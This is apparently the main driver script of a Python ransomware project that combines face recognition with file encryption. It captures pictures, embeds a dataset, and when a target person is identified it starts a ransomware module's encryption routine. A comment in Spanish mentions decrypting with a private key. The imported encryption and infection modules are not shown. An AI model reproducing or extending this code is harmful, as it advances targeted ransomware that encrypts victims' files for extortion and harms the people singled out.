# -*- coding: utf-8 -*-


import sys
from sys import path
import os



#from NeuralNetwork import *

from obtainPictures import *
from testInfectPerson import *
from file_encryption.ransomware import *
class Main(object):
   
    def decriptRansom(self):
        self.enc=FileEncript()
        self.keygen=RSAkeygeneration()
        
        
    def __init__(self):
        
        pass
        
           #USar clave privada para desencriptar el codigo
    def execute(self):
        path=os.path.abspath(os.getcwd())
        print(path)
        self.obtain=ObtainPicture()
        self.obtain.obtainPicture()
        os.chdir(path)
        print(path)
        self.person = TestInfectPerson()
        # load train dataset
        
        self.person.saveDataset()
        self.person.embeddingDataset()
        if( self.person.identifyPerson()):
            pp = Ramsomware()
            pp.beginEncript()
            



if __name__ == '__main__':
    
    main = Main()
    main.execute()
